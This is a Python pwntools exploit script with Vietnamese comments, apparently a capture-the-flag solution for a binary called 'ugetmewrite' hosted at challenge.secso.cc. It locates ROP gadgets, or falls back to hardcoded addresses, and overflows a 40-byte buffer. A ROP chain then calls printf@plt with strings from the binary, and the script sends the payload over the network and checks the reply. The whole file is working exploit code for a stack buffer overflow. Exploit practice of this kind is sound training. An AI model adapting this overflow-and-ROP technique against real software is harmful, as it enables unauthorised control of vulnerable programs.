from pwn import *

# Sử dụng pwntools để tự động tìm gadget
# Cần có file binary 'ugetmewrite' trong cùng thư mục
try:
    elf = context.binary = ELF('./ugetmewrite')
    rop = ROP(elf)

    # Tìm các gadget cần thiết
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    # Gadget cho RSI có thể phức tạp hơn, ví dụ pop rsi; pop r15; ret
    POP_RSI_R15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0] 
    RET = rop.find_gadget(['ret'])[0]

    # Lấy địa chỉ các chuỗi và hàm printf
    STR_HELLO = next(elf.search(b'Hello! %s\n'))
    STR_PLEASURE = next(elf.search(b'Pleasure to meet you!'))
    PRINTF_PLT = elf.plt['printf']

    log.info(f"Found 'pop rdi; ret' at: {hex(POP_RDI)}")
    log.info(f"Found 'pop rsi; pop r15; ret' at: {hex(POP_RSI_R15)}")
    log.info(f"Found 'ret' for alignment at: {hex(RET)}")
    log.info(f"Found 'printf@plt' at: {hex(PRINTF_PLT)}")
    log.info(f"Found string 'Hello! ...' at: {hex(STR_HELLO)}")
    log.info(f"Found string 'Pleasure ...' at: {hex(STR_PLEASURE)}")

except IOError:
    log.error("Binary 'ugetmewrite' not found. Using hardcoded addresses.")
    # --- Địa chỉ hardcode nếu không có file binary ---
    POP_RDI = 0x000000000040122b
    POP_RSI_R15 = 0x0000000000401229
    RET = 0x000000000040101a
    PRINTF_PLT = 0x401050
    STR_HELLO = 0x402037
    STR_PLEASURE = 0x402008
    # --------------------------------------------------

# Offset vẫn là 40
offset = 40

# Xây dựng ROP chain
rop_chain = b''
rop_chain += p64(RET)           # 1. Gadget ret để căn lề stack 16-byte
rop_chain += p64(POP_RDI)       # 2. Pop giá trị tiếp theo vào RDI
rop_chain += p64(STR_HELLO)     # 3. Địa chỉ chuỗi format "Hello! %s\n"
rop_chain += p64(POP_RSI_R15)   # 4. Pop 2 giá trị tiếp theo vào RSI và R15
rop_chain += p64(STR_PLEASURE)  # 5. Địa chỉ chuỗi "Pleasure..." (sẽ vào RSI)
rop_chain += p64(0)             # 6. Giá trị rác (sẽ vào R15)
rop_chain += p64(PRINTF_PLT)    # 7. Gọi hàm printf

# Xây dựng payload cuối cùng
payload = b'A' * offset + rop_chain

# --- Phần kết nối và gửi payload ---
r = remote('challenge.secso.cc', 8004)
r.recvuntil(b'name: ')
log.info("Sending ROP payload...")
r.sendline(payload)

try:
    response = r.recvline(timeout=2)
    if b"Hello!" in response:
        log.success("ROP chain successful! printf was called again.")
        print("Received:", response.decode().strip())
    else:
        log.warning("ROP chain might have failed.")
        print("Received:", response.decode().strip())
except EOFError:
    log.error("Connection closed unexpectedly.")

r.close()